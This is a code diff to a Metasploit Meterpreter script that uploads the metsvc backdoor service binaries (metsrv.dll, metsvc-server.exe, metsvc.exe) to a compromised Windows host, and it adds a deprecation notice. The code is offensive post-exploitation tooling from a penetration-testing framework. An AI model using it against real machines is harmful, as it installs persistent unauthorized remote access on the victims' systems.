@@ -1,3 +1,11 @@
+##
+# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# If you'd like to imporve this script, please try to port it as a post
+# module instead. Thank you.
+##
+
+
+
 #
 # Meterpreter script for installing the meterpreter service
 #
@@ -70,11 +78,22 @@ if client.platform =~ /win32|win64/
   print_status("Creating a temporary installation directory #{tempdir}...")
   client.fs.dir.mkdir(tempdir)
 
-  %W{ metsrv.dll metsvc-server.exe metsvc.exe }.each do |bin|
-    next if (bin != "metsvc.exe" and remove)
-    print_status(" >> Uploading #{bin}...")
-    fd = client.fs.file.new(tempdir + "\\" + bin, "wb")
-    fd.write(::File.read(File.join(based, bin), ::File.size(::File.join(based, bin))))
+  # Use an array of `from -> to` associations so that things
+  # such as metsrv can be copied from the appropriate location
+  # but named correctly on the target.
+  bins = {
+    'metsrv.x86.dll'    => 'metsrv.dll',
+    'metsvc-server.exe' => nil,
+    'metsvc.exe'        => nil
+  }
+
+  bins.each do |from, to|
+    next if (from != "metsvc.exe" and remove)
+    to ||= from
+    print_status(" >> Uploading #{from}...")
+    fd = client.fs.file.new(tempdir + "\\" + to, "wb")
+    path = (from == 'metsrv.x86.dll') ? MeterpreterBinaries.path('metsrv','x86.dll') : File.join(based, from)
+    fd.write(::File.read(path, ::File.size(path)))
     fd.close
   end
 
